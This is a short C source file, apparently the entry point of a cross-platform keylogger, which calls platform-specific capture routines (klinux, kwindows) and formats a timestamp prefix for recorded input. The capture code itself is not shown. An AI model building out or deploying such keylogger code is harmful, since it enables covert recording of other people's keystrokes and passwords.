#include<stdio.h>
#include<time.h>
#include<string.h>
#include"keylogger.h"

int main(void)
{
#ifdef linux
  klinux();
#elif WIN32
  kwindows();
#endif
  return 0;
}

void format_time(char *time_variable)
{
  time_t rawtime;
  struct tm * timeinfo;
  // get system time
  time (&rawtime);
  timeinfo = localtime ( &rawtime );
  strcpy(time_variable,"Time: ");
  strcat(time_variable,asctime(timeinfo));
  int size = strlen(time_variable);
  time_variable[size-1] = '\0';
  strcat(time_variable ," Input:");
}
